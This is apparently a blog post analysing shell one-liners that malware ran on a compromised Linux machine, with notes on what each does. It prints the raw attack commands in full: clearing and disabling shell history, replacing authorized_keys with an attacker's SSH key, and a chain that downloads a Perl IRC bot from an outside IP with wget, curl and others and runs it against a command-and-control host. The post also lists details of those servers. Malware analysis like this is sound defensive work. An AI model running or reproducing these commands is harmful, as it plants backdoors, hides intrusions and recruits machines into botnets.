---
title: Malware Shell Oneliners
published: true
description: Several command oneliner tricks used by malware.
---

# Command line tricks used by malware.

## 1. Processor cores
```bash
cat /proc/cpuinfo | grep name | wc -l
```
I found this oneliner actually cool, it prints the number of processor cores you have. 

## 2. Cleaning history and backdooring device
```bash
uname -a;
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;
history -n;
export HISTFILE=/dev/null;
export HISTSIZE=0;
export HISTFILESIZE=0;
cd;
mkdir .ssh;
rm -rf .ssh/authorized_keys;
touch .ssh/authorized_keys;
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/authorized_keys;cd
```

This code blob actually was one long line, it does several things:
* Checks operating system
* Clears and disables shell history
* Clears old ssh public keys and pushes his own

### 3. Fingerprinting a system
```bash
1) uname -n -s -r -v;         # Full name in specific order 
2) uname -a & lscpu;          # Prints full name and proc information. 
                              # Symbol '&' forces first command to migrate to another 
                              # process which purpose is unclear to me, might be a bug.
3) uname -snrvo; uptime -p;   # Full name in specific order and time since system start
4) uname -a ; lscpu;          # Prints full name of OS including kernel version
5) uname;                     # Prints you the name of OS (ex: Linux)
6) cat /proc/cpuinfo;         # Info about processor 
7) free -m;                   # How much free disk space is left
```

### 4. Removing other potential malware and install his own
```bash
killall -9 perl;
cd /var/tmp/ ; 
cd /tmp/ ; 
rm -rf ssh1.txt ; 

wget http://185.234.217.21/ssh1.txt ; 
mv ssh1.txt wget.txt ; 

perl wget.txt 193.169.254.11; 
lwp-download http://185.234.217.21/ssh1.txt ; 
mv ssh1.txt lynx.txt ; 
perl lynx.txt 193.169.254.11;
fetch http://185.234.217.21/ssh1.txt ; 
mv ssh1.txt fetch.txt ; 
perl fetch.txt 193.169.254.11; 
curl -O http://185.234.217.21/ssh1.txt ; 
mv ssh1.txt curl.txt ; 
perl curl.txt 193.169.254.11 ; 
rm -rf ssh1.txt wget.txt lynx.txt fetch.txt curl.txt
```
This oneliner tries to download and later run perl bot in several methods using wget, lwp-download, fetch, curl.
Then connects to CnC server which is located in 193.169.254.11.



### 5. Command and control servers
```
185.234.217.21:
  Server location: Ireland
  Hosting:
    ssh1.txt - main perl IRC bot script
    Polish google phishing page
  Nmap scan:
    21/tcp   open     ftp
    22/tcp   open     ssh
    80/tcp   open     http
    1723/tcp filtered pptp
```

```
 193.169.254.11:
    Server location: Poland
    Hosting:
      Several IRC servers for botnet CnC
    Nmap scan:
      22/tcp    open     ssh
      80/tcp    open     http
      81/tcp    open     hosts2-ns
      111/tcp   open     rpcbind
      143/tcp   open     imap
      443/tcp   open     https
      1723/tcp  filtered pptp
      2222/tcp  open     EtherNetIP-1
      6667/tcp  open     irc
      8080/tcp  open     http-proxy
      8443/tcp  open     https-alt
      10000/tcp open     snet-sensor-mgmt
```
